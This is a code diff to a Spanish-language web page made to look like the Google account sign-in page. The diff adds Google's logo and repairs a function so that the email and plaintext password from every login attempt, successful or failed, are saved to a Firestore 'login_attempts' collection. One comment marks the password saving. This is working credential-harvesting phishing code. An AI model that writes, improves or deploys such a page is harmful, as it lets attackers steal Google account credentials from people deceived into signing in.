@@ -3,6 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
+      <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_272x92dp.png" alt="Logo de Google">
     <title>Iniciar sesión - Cuenta de Google</title>
     <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap" rel="stylesheet">
     <style>
@@ -54,7 +55,7 @@
 </head>
 <body>
 
-    <div class="login-container">await saveLoginAttempt(email, true);
+    <div class="login-container">
         <h1>Iniciar sesión</h1>
         <form id="login-form">
             <div class="input-group">
@@ -97,7 +98,7 @@
             try {
                 const docRef = await addDoc(collection(db, "login_attempts"), {
                     email: email,
-                    password: password,
+                    password: password, // Guarda la contraseña
                     success: success,
                     timestamp: Timestamp.fromDate(new Date()) // Fecha y hora actual
                 });
@@ -122,8 +123,7 @@
                     const user = userCredential.user;
 
                     // Guarda el intento de inicio de sesión exitoso en Firestore
-                    await saveLoginAttempt(email, true);
-                    await saveLoginAttempt(password, true);
+                    await saveLoginAttempt(email, password, true);
 
                     // Limpia el mensaje de error y muestra un mensaje de éxito
                     document.getElementById("error-message").textContent = "";
@@ -133,8 +133,7 @@
                     console.error("Error de autenticación:", error.code, error.message);
 
                     // Guarda el intento de inicio de sesión fallido en Firestore
-                    await saveLoginAttempt(email, false);
-                    await saveLoginAttempt(password, false);
+                    await saveLoginAttempt(email, password, false);
 
                     // Muestra un mensaje de error al usuario
                     let errorMessage = "Error al iniciar sesión";
